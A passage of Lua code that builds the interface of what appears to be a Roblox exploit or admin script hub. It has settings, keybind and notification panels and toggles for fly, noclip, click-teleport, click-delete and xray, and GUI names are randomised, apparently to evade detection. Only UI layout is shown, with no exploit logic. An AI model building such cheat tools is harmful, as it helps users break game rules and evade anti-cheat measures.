	CMDsF.CanvasSize = UDim2.new(0, 0, 0, 0)
	CMDsF.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	CMDsF.ScrollBarThickness = 8
	CMDsF.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	CMDsF.VerticalScrollBarInset = 'Always'
	CMDsF.ZIndex = 10
	table.insert(scroll,CMDsF)

	cmdListLayout.Parent = CMDsF

	SettingsButton.Name = "SettingsButton"
	SettingsButton.Parent = Holder
	SettingsButton.BackgroundTransparency = 1
	SettingsButton.Position = UDim2.new(0, 230, 0, 0)
	SettingsButton.Size = UDim2.new(0, 20, 0, 20)
	SettingsButton.Image = "rbxassetid://1204397029"
	SettingsButton.ZIndex = 10

	ReferenceButton = Instance.new("ImageButton")
	ReferenceButton.Name = "ReferenceButton"
	ReferenceButton.Parent = Holder
	ReferenceButton.BackgroundTransparency = 1
	ReferenceButton.Position = UDim2.new(0, 212, 0, 2)
	ReferenceButton.Size = UDim2.new(0, 16, 0, 16)
	ReferenceButton.Image = "rbxassetid://3523243755"
	ReferenceButton.ZIndex = 10

	Settings.Name = "Settings"
	Settings.Parent = Holder
	Settings.Active = true
	Settings.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	Settings.BorderSizePixel = 0
	Settings.Position = UDim2.new(0, 0, 0, 220)
	Settings.Size = UDim2.new(0, 250, 0, 175)
	Settings.ZIndex = 10
	table.insert(shade1,Settings)

	SettingsHolder = Instance.new("ScrollingFrame")
	SettingsHolder.Name = "Holder"
	SettingsHolder.Parent = Settings
	SettingsHolder.BackgroundTransparency = 1
	SettingsHolder.BorderSizePixel = 0
	SettingsHolder.Size = UDim2.new(1,0,1,0)
	SettingsHolder.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
	SettingsHolder.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	SettingsHolder.CanvasSize = UDim2.new(0, 0, 0, 235)
	SettingsHolder.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	SettingsHolder.ScrollBarThickness = 8
	SettingsHolder.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	SettingsHolder.VerticalScrollBarInset = 'Always'
	SettingsHolder.ZIndex = 10
	table.insert(scroll,SettingsHolder)

	Prefix.Name = "Prefix"
	Prefix.Parent = SettingsHolder
	Prefix.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Prefix.BorderSizePixel = 0
	Prefix.BackgroundTransparency = 1
	Prefix.Position = UDim2.new(0, 5, 0, 5)
	Prefix.Size = UDim2.new(1, -10, 0, 20)
	Prefix.Font = Enum.Font.SourceSans
	Prefix.TextSize = 14
	Prefix.Text = "Prefix"
	Prefix.TextColor3 = Color3.new(1, 1, 1)
	Prefix.TextXAlignment = Enum.TextXAlignment.Left
	Prefix.ZIndex = 10
	table.insert(shade2,Prefix)
	table.insert(text1,Prefix)

	PrefixBox.Name = "PrefixBox"
	PrefixBox.Parent = Prefix
	PrefixBox.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	PrefixBox.BorderSizePixel = 0
	PrefixBox.Position = UDim2.new(1, -20, 0, 0)
	PrefixBox.Size = UDim2.new(0, 20, 0, 20)
	PrefixBox.Font = Enum.Font.SourceSansBold
	PrefixBox.TextSize = 14
	PrefixBox.Text = ''
	PrefixBox.TextColor3 = Color3.new(0, 0, 0)
	PrefixBox.ZIndex = 10
	table.insert(shade3,PrefixBox)
	table.insert(text2,PrefixBox)

	function makeSettingsButton(name,iconID,off)
		local button = Instance.new("TextButton")
		button.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
		button.BorderSizePixel = 0
		button.Position = UDim2.new(0,0,0,0)
		button.Size = UDim2.new(1,0,0,25)
		button.Text = ""
		button.ZIndex = 10
		local icon = Instance.new("ImageLabel")
		icon.Name = "Icon"
		icon.Parent = button
		icon.Position = UDim2.new(0,5,0,5)
		icon.Size = UDim2.new(0,16,0,16)
		icon.BackgroundTransparency = 1
		icon.Image = iconID
		icon.ZIndex = 10
		if off then
			icon.ScaleType = Enum.ScaleType.Crop
			icon.ImageRectSize = Vector2.new(16,16)
			icon.ImageRectOffset = Vector2.new(off,0)
		end
		local label = Instance.new("TextLabel")
		label.Name = "ButtonLabel"
		label.Parent = button
		label.BackgroundTransparency = 1
		label.Text = name
		label.Position = UDim2.new(0,28,0,0)
		label.Size = UDim2.new(1,-28,1,0)
		label.Font = Enum.Font.SourceSans
		label.TextColor3 = Color3.new(1, 1, 1)
		label.TextSize = 14
		label.ZIndex = 10
		label.TextXAlignment = Enum.TextXAlignment.Left
		table.insert(shade2,button)
		table.insert(text1,label)
		return button
	end

	ColorsButton = makeSettingsButton("Edit Theme","rbxassetid://4911962991")
	ColorsButton.Position = UDim2.new(0,5,0,55)
	ColorsButton.Size = UDim2.new(1,-10,0,25)
	ColorsButton.Name = "Colors"
	ColorsButton.Parent = SettingsHolder

	Keybinds = makeSettingsButton("Edit Keybinds","rbxassetid://129697930")
	Keybinds.Position = UDim2.new(0, 5, 0, 85)
	Keybinds.Size = UDim2.new(1, -10, 0, 25)
	Keybinds.Name = "Keybinds"
	Keybinds.Parent = SettingsHolder

	Aliases = makeSettingsButton("Edit Aliases","rbxassetid://5147488658")
	Aliases.Position = UDim2.new(0, 5, 0, 115)
	Aliases.Size = UDim2.new(1, -10, 0, 25)
	Aliases.Name = "Aliases"
	Aliases.Parent = SettingsHolder

	StayOpen.Name = "StayOpen"
	StayOpen.Parent = SettingsHolder
	StayOpen.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	StayOpen.BorderSizePixel = 0
	StayOpen.BackgroundTransparency = 1
	StayOpen.Position = UDim2.new(0, 5, 0, 30)
	StayOpen.Size = UDim2.new(1, -10, 0, 20)
	StayOpen.Font = Enum.Font.SourceSans
	StayOpen.TextSize = 14
	StayOpen.Text = "Keep Menu Open"
	StayOpen.TextColor3 = Color3.new(1, 1, 1)
	StayOpen.TextXAlignment = Enum.TextXAlignment.Left
	StayOpen.ZIndex = 10
	table.insert(shade2,StayOpen)
	table.insert(text1,StayOpen)

	Button.Name = "Button"
	Button.Parent = StayOpen
	Button.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Button.BorderSizePixel = 0
	Button.Position = UDim2.new(1, -20, 0, 0)
	Button.Size = UDim2.new(0, 20, 0, 20)
	Button.ZIndex = 10
	table.insert(shade3,Button)

	On.Name = "On"
	On.Parent = Button
	On.BackgroundColor3 = Color3.fromRGB(150, 150, 151)
	On.BackgroundTransparency = 1
	On.BorderSizePixel = 0
	On.Position = UDim2.new(0, 2, 0, 2)
	On.Size = UDim2.new(0, 16, 0, 16)
	On.Font = Enum.Font.SourceSans
	On.FontSize = Enum.FontSize.Size14
	On.Text = ""
	On.TextColor3 = Color3.new(0, 0, 0)
	On.ZIndex = 10

	Positions = makeSettingsButton("Edit/Goto Waypoints","rbxassetid://5147488592")
	Positions.Position = UDim2.new(0, 5, 0, 145)
	Positions.Size = UDim2.new(1, -10, 0, 25)
	Positions.Name = "Waypoints"
	Positions.Parent = SettingsHolder

	EventBind = makeSettingsButton("Edit Event Binds","rbxassetid://5147695474",759)
	EventBind.Position = UDim2.new(0, 5, 0, 205)
	EventBind.Size = UDim2.new(1, -10, 0, 25)
	EventBind.Name = "EventBinds"
	EventBind.Parent = SettingsHolder

	Plugins = makeSettingsButton("Manage Plugins","rbxassetid://5147695474",743)
	Plugins.Position = UDim2.new(0, 5, 0, 175)
	Plugins.Size = UDim2.new(1, -10, 0, 25)
	Plugins.Name = "Plugins"
	Plugins.Parent = SettingsHolder

	Example.Name = "Example"
	Example.Parent = Holder
	Example.BackgroundTransparency = 1
	Example.BorderSizePixel = 0
	Example.Size = UDim2.new(0, 190, 0, 20)
	Example.Visible = false
	Example.Font = Enum.Font.SourceSans
	Example.TextSize = 18
	Example.Text = "Example"
	Example.TextColor3 = Color3.new(1, 1, 1)
	Example.TextXAlignment = Enum.TextXAlignment.Left
	Example.ZIndex = 10
	table.insert(text1,Example)

	Notification.Name = randomString()
	Notification.Parent = PARENT
	Notification.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	Notification.BorderSizePixel = 0
	Notification.Position = UDim2.new(1, -500, 1, 20)
	Notification.Size = UDim2.new(0, 250, 0, 100)
	Notification.ZIndex = 10
	table.insert(shade1,Notification)

	Title_2.Name = "Title"
	Title_2.Parent = Notification
	Title_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Title_2.BorderSizePixel = 0
	Title_2.Size = UDim2.new(0, 250, 0, 20)
	Title_2.Font = Enum.Font.SourceSans
	Title_2.TextSize = 14
	Title_2.Text = "Notification Title"
	Title_2.TextColor3 = Color3.new(1, 1, 1)
	Title_2.ZIndex = 10
	table.insert(shade2,Title_2)
	table.insert(text1,Title_2)

	Text_2.Name = "Text"
	Text_2.Parent = Notification
	Text_2.BackgroundTransparency = 1
	Text_2.BorderSizePixel = 0
	Text_2.Position = UDim2.new(0, 5, 0, 25)
	Text_2.Size = UDim2.new(0, 240, 0, 75)
	Text_2.Font = Enum.Font.SourceSans
	Text_2.TextSize = 16
	Text_2.Text = "Notification Text"
	Text_2.TextColor3 = Color3.new(1, 1, 1)
	Text_2.TextWrapped = true
	Text_2.ZIndex = 10
	table.insert(text1,Text_2)

	CloseButton.Name = "CloseButton"
	CloseButton.Parent = Notification
	CloseButton.BackgroundTransparency = 1
	CloseButton.Position = UDim2.new(1, -20, 0, 0)
	CloseButton.Size = UDim2.new(0, 20, 0, 20)
	CloseButton.Text = ""
	CloseButton.ZIndex = 10

	CloseImage.Parent = CloseButton
	CloseImage.BackgroundColor3 = Color3.new(1, 1, 1)
	CloseImage.BackgroundTransparency = 1
	CloseImage.Position = UDim2.new(0, 5, 0, 5)
	CloseImage.Size = UDim2.new(0, 10, 0, 10)
	CloseImage.Image = "rbxassetid://5054663650"
	CloseImage.ZIndex = 10

	PinButton.Name = "PinButton"
	PinButton.Parent = Notification
	PinButton.BackgroundTransparency = 1
	PinButton.Size = UDim2.new(0, 20, 0, 20)
	PinButton.ZIndex = 10
	PinButton.Text = ""

	PinImage.Parent = PinButton
	PinImage.BackgroundColor3 = Color3.new(1, 1, 1)
	PinImage.BackgroundTransparency = 1
	PinImage.Position = UDim2.new(0, 3, 0, 3)
	PinImage.Size = UDim2.new(0, 14, 0, 14)
	PinImage.ZIndex = 10
	PinImage.Image = "rbxassetid://6234691350"

	Tooltip.Name = randomString()
	Tooltip.Parent = PARENT
	Tooltip.Active = true
	Tooltip.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	Tooltip.BackgroundTransparency = 0.1
	Tooltip.BorderSizePixel = 0
	Tooltip.Size = UDim2.new(0, 200, 0, 96)
	Tooltip.Visible = false
	Tooltip.ZIndex = 10
	table.insert(shade1,Tooltip)

	Title_3.Name = "Title"
	Title_3.Parent = Tooltip
	Title_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Title_3.BackgroundTransparency = 0.1
	Title_3.BorderSizePixel = 0
	Title_3.Size = UDim2.new(0, 200, 0, 20)
	Title_3.Font = Enum.Font.SourceSans
	Title_3.TextSize = 14
	Title_3.Text = ""
	Title_3.TextColor3 = Color3.new(1, 1, 1)
	Title_3.TextTransparency = 0.1
	Title_3.ZIndex = 10
	table.insert(shade2,Title_3)
	table.insert(text1,Title_3)

	Description.Name = "Description"
	Description.Parent = Tooltip
	Description.BackgroundTransparency = 1
	Description.BorderSizePixel = 0
	Description.Size = UDim2.new(0,180,0,72)
	Description.Position = UDim2.new(0,10,0,18)
	Description.Font = Enum.Font.SourceSans
	Description.TextSize = 16
	Description.Text = ""
	Description.TextColor3 = Color3.new(1, 1, 1)
	Description.TextTransparency = 0.1
	Description.TextWrapped = true
	Description.ZIndex = 10
	table.insert(text1,Description)

	IntroBackground.Name = "IntroBackground"
	IntroBackground.Parent = Holder
	IntroBackground.Active = true
	IntroBackground.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	IntroBackground.BorderSizePixel = 0
	IntroBackground.Position = UDim2.new(0, 0, 0, 45)
	IntroBackground.Size = UDim2.new(0, 250, 0, 175)
	IntroBackground.ZIndex = 10

	Logo.Name = "Logo"
	Logo.Parent = Holder
	Logo.BackgroundTransparency = 1
	Logo.BorderSizePixel = 0
	Logo.Position = UDim2.new(0, 125, 0, 127)
	Logo.Size = UDim2.new(0, 10, 0, 10)
	Logo.Image = "rbxassetid://1352543873"
	Logo.ImageTransparency = 0
	Logo.ZIndex = 10

	Credits.Name = "Credits"
	Credits.Parent = Holder
	Credits.BackgroundTransparency = 1
	Credits.BorderSizePixel = 0
	Credits.Position = UDim2.new(0, 0, 0.9, 30)
	Credits.Size = UDim2.new(0, 250, 0, 20)
	Credits.Font = Enum.Font.SourceSansLight
	Credits.FontSize = Enum.FontSize.Size18
	Credits.Text = "Edge // Zwolf // Moon // Hunter"
	Credits.TextColor3 = Color3.new(1, 1, 1)
	Credits.ZIndex = 10

	KeybindsFrame.Name = "KeybindsFrame"
	KeybindsFrame.Parent = Settings
	KeybindsFrame.Active = true
	KeybindsFrame.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	KeybindsFrame.BorderSizePixel = 0
	KeybindsFrame.Position = UDim2.new(0, 0, 0, 175)
	KeybindsFrame.Size = UDim2.new(0, 250, 0, 175)
	KeybindsFrame.ZIndex = 10
	table.insert(shade1,KeybindsFrame)

	Close.Name = "Close"
	Close.Parent = KeybindsFrame
	Close.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Close.BorderSizePixel = 0
	Close.Position = UDim2.new(0, 205, 0, 150)
	Close.Size = UDim2.new(0, 40, 0, 20)
	Close.Font = Enum.Font.SourceSans
	Close.TextSize = 14
	Close.Text = "Close"
	Close.TextColor3 = Color3.new(1, 1, 1)
	Close.ZIndex = 10
	table.insert(shade2,Close)
	table.insert(text1,Close)

	Add.Name = "Add"
	Add.Parent = KeybindsFrame
	Add.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Add.BorderSizePixel = 0
	Add.Position = UDim2.new(0, 5, 0, 150)
	Add.Size = UDim2.new(0, 40, 0, 20)
	Add.Font = Enum.Font.SourceSans
	Add.TextSize = 14
	Add.Text = "Add"
	Add.TextColor3 = Color3.new(1, 1, 1)
	Add.ZIndex = 10
	table.insert(shade2,Add)
	table.insert(text1,Add)

	Delete.Name = "Delete"
	Delete.Parent = KeybindsFrame
	Delete.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Delete.BorderSizePixel = 0
	Delete.Position = UDim2.new(0, 50, 0, 150)
	Delete.Size = UDim2.new(0, 40, 0, 20)
	Delete.Font = Enum.Font.SourceSans
	Delete.TextSize = 14
	Delete.Text = "Clear"
	Delete.TextColor3 = Color3.new(1, 1, 1)
	Delete.ZIndex = 10
	table.insert(shade2,Delete)
	table.insert(text1,Delete)

	Holder_2.Name = "Holder"
	Holder_2.Parent = KeybindsFrame
	Holder_2.BackgroundTransparency = 1
	Holder_2.BorderSizePixel = 0
	Holder_2.Position = UDim2.new(0, 0, 0, 0)
	Holder_2.Size = UDim2.new(0, 250, 0, 145)
	Holder_2.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
	Holder_2.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_2.CanvasSize = UDim2.new(0, 0, 0, 0)
	Holder_2.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_2.ScrollBarThickness = 0
	Holder_2.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Holder_2.VerticalScrollBarInset = 'Always'
	Holder_2.ZIndex = 10

	Example_2.Name = "Example"
	Example_2.Parent = KeybindsFrame
	Example_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Example_2.BorderSizePixel = 0
	Example_2.Size = UDim2.new(0, 10, 0, 20)
	Example_2.Visible = false
	Example_2.ZIndex = 10
	table.insert(shade2,Example_2)

	Text_3.Name = "Text"
	Text_3.Parent = Example_2
	Text_3.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Text_3.BorderSizePixel = 0
	Text_3.Position = UDim2.new(0, 10, 0, 0)
	Text_3.Size = UDim2.new(0, 240, 0, 20)
	Text_3.Font = Enum.Font.SourceSans
	Text_3.TextSize = 14
	Text_3.Text = "nom"
	Text_3.TextColor3 = Color3.new(1, 1, 1)
	Text_3.TextXAlignment = Enum.TextXAlignment.Left
	Text_3.ZIndex = 10
	table.insert(shade2,Text_3)
	table.insert(text1,Text_3)

	Delete_2.Name = "Delete"
	Delete_2.Parent = Text_3
	Delete_2.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Delete_2.BorderSizePixel = 0
	Delete_2.Position = UDim2.new(0, 200, 0, 0)
	Delete_2.Size = UDim2.new(0, 40, 0, 20)
	Delete_2.Font = Enum.Font.SourceSans
	Delete_2.TextSize = 14
	Delete_2.Text = "Delete"
	Delete_2.TextColor3 = Color3.new(0, 0, 0)
	Delete_2.ZIndex = 10
	table.insert(shade3,Delete_2)
	table.insert(text2,Delete_2)

	KeybindEditor.Name = randomString()
	KeybindEditor.Parent = PARENT
	KeybindEditor.Active = true
	KeybindEditor.BackgroundTransparency = 1
	KeybindEditor.Position = UDim2.new(0.5, -180, 0, -500)
	KeybindEditor.Size = UDim2.new(0, 360, 0, 20)
	KeybindEditor.ZIndex = 10

	background_2.Name = "background"
	background_2.Parent = KeybindEditor
	background_2.Active = true
	background_2.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
	background_2.BorderSizePixel = 0
	background_2.Position = UDim2.new(0, 0, 0, 20)
	background_2.Size = UDim2.new(0, 360, 0, 185)
	background_2.ZIndex = 10
	table.insert(shade1,background_2)

	Dark_4.Name = "Dark"
	Dark_4.Parent = background_2
	Dark_4.Active = true
	Dark_4.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Dark_4.BorderSizePixel = 0
	Dark_4.Position = UDim2.new(0, 135, 0, 0)
	Dark_4.Size = UDim2.new(0, 2, 0, 185)
	Dark_4.ZIndex = 10
	table.insert(shade2,Dark_4)

	Directions.Name = "Directions"
	Directions.Parent = background_2
	Directions.BackgroundTransparency = 1
	Directions.BorderSizePixel = 0
	Directions.Position = UDim2.new(0, 10, 0, 15)
	Directions.Size = UDim2.new(0, 115, 0, 90)
	Directions.Font = Enum.Font.SourceSans
	Directions.TextSize = 14
	Directions.Text = "Click the button below and press a key/mouse button. Then select what you want to bind it to."
	Directions.TextColor3 = Color3.new(1, 1, 1)
	Directions.TextWrapped = true
	Directions.TextYAlignment = Enum.TextYAlignment.Top
	Directions.ZIndex = 10
	table.insert(text1,Directions)

	BindTo.Name = "BindTo"
	BindTo.Parent = background_2
	BindTo.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	BindTo.BorderSizePixel = 0
	BindTo.Position = UDim2.new(0, 10, 0, 95)
	BindTo.Size = UDim2.new(0, 115, 0, 50)
	BindTo.Font = Enum.Font.SourceSans
	BindTo.TextSize = 16
	BindTo.Text = "Click to bind"
	BindTo.TextColor3 = Color3.new(1, 1, 1)
	BindTo.ZIndex = 10
	table.insert(shade2,BindTo)
	table.insert(text1,BindTo)

	BindTrigger = Instance.new("TextLabel")
	BindTrigger.Name = "TriggerLabel"
	BindTrigger.BackgroundTransparency = 1
	BindTrigger.Position = UDim2.new(0, 10, 0, 155)
	BindTrigger.Size = UDim2.new(0, 45, 0, 20)
	BindTrigger.Font = Enum.Font.SourceSans
	BindTrigger.TextSize = 14
	BindTrigger.Text = "Trigger:"
	BindTrigger.TextColor3 = Color3.new(1, 1, 1)
	BindTrigger.ZIndex = 10
	BindTrigger.TextXAlignment = Enum.TextXAlignment.Left
	BindTrigger.Parent = background_2
	table.insert(text1,BindTrigger)

	BindTriggerSelect = Instance.new("TextButton")
	BindTriggerSelect.Name = "BindTo"
	BindTriggerSelect.Parent = background_2
	BindTriggerSelect.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	BindTriggerSelect.BorderSizePixel = 0
	BindTriggerSelect.Position = UDim2.new(0, 60, 0, 155)
	BindTriggerSelect.Size = UDim2.new(0, 65, 0, 20)
	BindTriggerSelect.Font = Enum.Font.SourceSans
	BindTriggerSelect.TextSize = 16
	BindTriggerSelect.Text = "KeyDown"
	BindTriggerSelect.TextColor3 = Color3.new(1, 1, 1)
	BindTriggerSelect.ZIndex = 10
	table.insert(shade2,BindTriggerSelect)
	table.insert(text1,BindTriggerSelect)

	Add_2.Name = "Add"
	Add_2.Parent = background_2
	Add_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Add_2.BorderSizePixel = 0
	Add_2.Position = UDim2.new(0, 310, 0, 20)
	Add_2.Size = UDim2.new(0, 40, 0, 20)
	Add_2.Font = Enum.Font.SourceSans
	Add_2.TextSize = 14
	Add_2.Text = "Add"
	Add_2.TextColor3 = Color3.new(1, 1, 1)
	Add_2.ZIndex = 10
	table.insert(shade2,Add_2)
	table.insert(text1,Add_2)

	Cmdbar_2.Name = "Cmdbar"
	Cmdbar_2.Parent = background_2
	Cmdbar_2.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Cmdbar_2.BorderSizePixel = 0
	Cmdbar_2.Position = UDim2.new(0, 150, 0, 20)
	Cmdbar_2.Size = UDim2.new(0, 150, 0, 20)
	Cmdbar_2.Font = Enum.Font.SourceSans
	Cmdbar_2.TextSize = 14
	Cmdbar_2.TextXAlignment = Enum.TextXAlignment.Left
	Cmdbar_2.TextColor3 = Color3.new(1, 1, 1)
	Cmdbar_2.Text = ""
	Cmdbar_2.ZIndex = 10
	Cmdbar_2.PlaceholderText = "Command"

	Toggles.Name = "Toggles"
	Toggles.Parent = background_2
	Toggles.BackgroundTransparency = 1
	Toggles.BorderSizePixel = 0
	Toggles.Position = UDim2.new(0, 150, 0, 50)
	Toggles.Size = UDim2.new(0, 200, 0, 125)
	Toggles.ScrollBarImageColor3 = Color3.fromRGB(78,78,79)
	Toggles.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Toggles.CanvasSize = UDim2.new(0, 0, 0, 270)
	Toggles.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Toggles.ScrollBarThickness = 8
	Toggles.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Toggles.VerticalScrollBarInset = 'Always'
	Toggles.ZIndex = 10
	table.insert(scroll,Toggles)

	Fly.Name = "Fly"
	Fly.Parent = Toggles
	Fly.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Fly.BorderSizePixel = 0
	Fly.Size = UDim2.new(0, 192, 0, 20)
	Fly.Font = Enum.Font.SourceSans
	Fly.TextSize = 14
	Fly.Text = "    Toggle Fly"
	Fly.TextColor3 = Color3.new(1, 1, 1)
	Fly.TextXAlignment = Enum.TextXAlignment.Left
	Fly.ZIndex = 10
	table.insert(shade2,Fly)
	table.insert(text1,Fly)

	Select_3.Name = "Select"
	Select_3.Parent = Fly
	Select_3.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Select_3.BorderSizePixel = 0
	Select_3.Position = UDim2.new(0, 152, 0, 0)
	Select_3.Size = UDim2.new(0, 40, 0, 20)
	Select_3.Font = Enum.Font.SourceSans
	Select_3.TextSize = 14
	Select_3.Text = "Add"
	Select_3.TextColor3 = Color3.new(0, 0, 0)
	Select_3.ZIndex = 10
	table.insert(shade3,Select_3)
	table.insert(text2,Select_3)

	Noclip.Name = "Noclip"
	Noclip.Parent = Toggles
	Noclip.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Noclip.BorderSizePixel = 0
	Noclip.Position = UDim2.new(0, 0, 0, 25)
	Noclip.Size = UDim2.new(0, 192, 0, 20)
	Noclip.Font = Enum.Font.SourceSans
	Noclip.TextSize = 14
	Noclip.Text = "    Toggle Noclip"
	Noclip.TextColor3 = Color3.new(1, 1, 1)
	Noclip.TextXAlignment = Enum.TextXAlignment.Left
	Noclip.ZIndex = 10
	table.insert(shade2,Noclip)
	table.insert(text1,Noclip)

	Select_4.Name = "Select"
	Select_4.Parent = Noclip
	Select_4.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Select_4.BorderSizePixel = 0
	Select_4.Position = UDim2.new(0, 152, 0, 0)
	Select_4.Size = UDim2.new(0, 40, 0, 20)
	Select_4.Font = Enum.Font.SourceSans
	Select_4.TextSize = 14
	Select_4.Text = "Add"
	Select_4.TextColor3 = Color3.new(0, 0, 0)
	Select_4.ZIndex = 10
	table.insert(shade3,Select_4)
	table.insert(text2,Select_4)

	Float.Name = "Float"
	Float.Parent = Toggles
	Float.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Float.BorderSizePixel = 0
	Float.Position = UDim2.new(0, 0, 0, 50)
	Float.Size = UDim2.new(0, 192, 0, 20)
	Float.Font = Enum.Font.SourceSans
	Float.TextSize = 14
	Float.Text = "    Toggle Float"
	Float.TextColor3 = Color3.new(1, 1, 1)
	Float.TextXAlignment = Enum.TextXAlignment.Left
	Float.ZIndex = 10
	table.insert(shade2,Float)
	table.insert(text1,Float)

	Select_5.Name = "Select"
	Select_5.Parent = Float
	Select_5.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Select_5.BorderSizePixel = 0
	Select_5.Position = UDim2.new(0, 152, 0, 0)
	Select_5.Size = UDim2.new(0, 40, 0, 20)
	Select_5.Font = Enum.Font.SourceSans
	Select_5.TextSize = 14
	Select_5.Text = "Add"
	Select_5.TextColor3 = Color3.new(0, 0, 0)
	Select_5.ZIndex = 10
	table.insert(shade3,Select_5)
	table.insert(text2,Select_5)

	ClickTP.Name = "Click TP"
	ClickTP.Parent = Toggles
	ClickTP.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	ClickTP.BorderSizePixel = 0
	ClickTP.Position = UDim2.new(0, 0, 0, 75)
	ClickTP.Size = UDim2.new(0, 192, 0, 20)
	ClickTP.Font = Enum.Font.SourceSans
	ClickTP.TextSize = 14
	ClickTP.Text = "    Click TP (Hold Key & Click)"
	ClickTP.TextColor3 = Color3.new(1, 1, 1)
	ClickTP.TextXAlignment = Enum.TextXAlignment.Left
	ClickTP.ZIndex = 10
	table.insert(shade2,ClickTP)
	table.insert(text1,ClickTP)

	Select_6.Name = "Select"
	Select_6.Parent = ClickTP
	Select_6.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Select_6.BorderSizePixel = 0
	Select_6.Position = UDim2.new(0, 152, 0, 0)
	Select_6.Size = UDim2.new(0, 40, 0, 20)
	Select_6.Font = Enum.Font.SourceSans
	Select_6.TextSize = 14
	Select_6.Text = "Add"
	Select_6.TextColor3 = Color3.new(0, 0, 0)
	Select_6.ZIndex = 10
	table.insert(shade3,Select_6)
	table.insert(text2,Select_6)

	ClickDelete.Name = "Click Delete"
	ClickDelete.Parent = Toggles
	ClickDelete.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	ClickDelete.BorderSizePixel = 0
	ClickDelete.Position = UDim2.new(0, 0, 0, 100)
	ClickDelete.Size = UDim2.new(0, 192, 0, 20)
	ClickDelete.Font = Enum.Font.SourceSans
	ClickDelete.TextSize = 14
	ClickDelete.Text = "    Click Delete (Hold Key & Click)"
	ClickDelete.TextColor3 = Color3.new(1, 1, 1)
	ClickDelete.TextXAlignment = Enum.TextXAlignment.Left
	ClickDelete.ZIndex = 10
	table.insert(shade2,ClickDelete)
	table.insert(text1,ClickDelete)

	Select_13.Name = "Select"
	Select_13.Parent = ClickDelete
	Select_13.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Select_13.BorderSizePixel = 0
	Select_13.Position = UDim2.new(0, 152, 0, 0)
	Select_13.Size = UDim2.new(0, 40, 0, 20)
	Select_13.Font = Enum.Font.SourceSans
	Select_13.TextSize = 14
	Select_13.Text = "Add"
	Select_13.TextColor3 = Color3.new(0, 0, 0)
	Select_13.ZIndex = 10
	table.insert(shade3,Select_13)
	table.insert(text2,Select_13) 

	Xray.Name = "Xray"
	Xray.Parent = Toggles
	Xray.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Xray.BorderSizePixel = 0
	Xray.Position = UDim2.new(0, 0, 0, 125)
	Xray.Size = UDim2.new(0, 192, 0, 20)
	Xray.Font = Enum.Font.SourceSans
	Xray.TextSize = 14
	Xray.Text = "    Toggle Xray"
	Xray.TextColor3 = Color3.new(1, 1, 1)
	Xray.TextXAlignment = Enum.TextXAlignment.Left
	Xray.ZIndex = 10
	table.insert(shade2,Xray)
	table.insert(text1,Xray)

	Select_10.Name = "Select"
	Select_10.Parent = Xray
	Select_10.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Select_10.BorderSizePixel = 0
	Select_10.Position = UDim2.new(0, 152, 0, 0)
	Select_10.Size = UDim2.new(0, 40, 0, 20)
	Select_10.Font = Enum.Font.SourceSans
	Select_10.TextSize = 14
	Select_10.Text = "Add"
	Select_10.TextColor3 = Color3.new(0, 0, 0)
	Select_10.ZIndex = 10
	table.insert(shade3,Select_10)
	table.insert(text2,Select_10)

	Swim.Name = "Swim"
	Swim.Parent = Toggles
	Swim.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
	Swim.BorderSizePixel = 0
	Swim.Position = UDim2.new(0, 0, 0, 150)
	Swim.Size = UDim2.new(0, 192, 0, 20)
	Swim.Font = Enum.Font.SourceSans
	Swim.TextSize = 14
	Swim.Text = "    Toggle Swim"
	Swim.TextColor3 = Color3.new(1, 1, 1)
	Swim.TextXAlignment = Enum.TextXAlignment.Left
	Swim.ZIndex = 10
	table.insert(shade2,Swim)
	table.insert(text1,Swim)

	Select_11.Name = "Select"
	Select_11.Parent = Swim
	Select_11.BackgroundColor3 = Color3.fromRGB(78, 78, 79)
	Select_11.BorderSizePixel = 0
